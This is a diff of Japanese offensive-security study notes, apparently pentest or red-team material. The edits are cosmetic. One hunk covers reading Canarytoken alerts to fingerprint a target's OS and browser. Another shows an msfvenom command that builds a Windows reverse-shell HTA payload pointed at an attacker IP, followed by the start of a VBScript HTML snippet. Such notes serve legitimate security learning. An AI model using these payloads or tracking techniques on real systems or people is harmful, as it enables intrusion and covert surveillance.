@@ -83,9 +83,9 @@
 
 ![](../画像ファイル/Pasted%20image%2020250513071026.png)
 
-7. Alerts listに記載のエントリをクリックすると、User-Agent、位置情報など、より詳細な情報を閲覧できる。
+7. Alerts listに記載のエントリをクリックすると、User-Agent、位置情報など、より詳細な情報を閲覧できる
 	- User-Agentから、ターゲットのOS・ブラウザを推測できる
-	- CanarytokenはWebページに埋め込まれたJavaScriptの[Fingerprintingのコード](https://github.com/fingerprintjs/fingerprintjs)でUser-Agentを調査しているので、信頼性は高い（単純にHTTPヘッダから入手しているのではない）
+	- CanarytokenはWebページに埋め込まれたJavaScriptの🔗[Fingerprintingのコード](https://github.com/fingerprintjs/fingerprintjs)でUser-Agentを調査しているので、信頼性は高い（単純にHTTPヘッダから入手しているのではない）
 	- 🔗[User-Agent parser](https://explore.whatismybrowser.com/useragents/parse/)
 
 >[!Warning]
@@ -666,8 +666,8 @@ msfvenom
 msfvenom -p windows/shell_reverse_tcp -f hta-psh -o shell.hta LPORT=443 LHOST=<attacker_IP>
 ```
 
-- コードスニペット
-```html application
+コードスニペット
+```html
 <html>
 <head>
 <script language="VBScript">
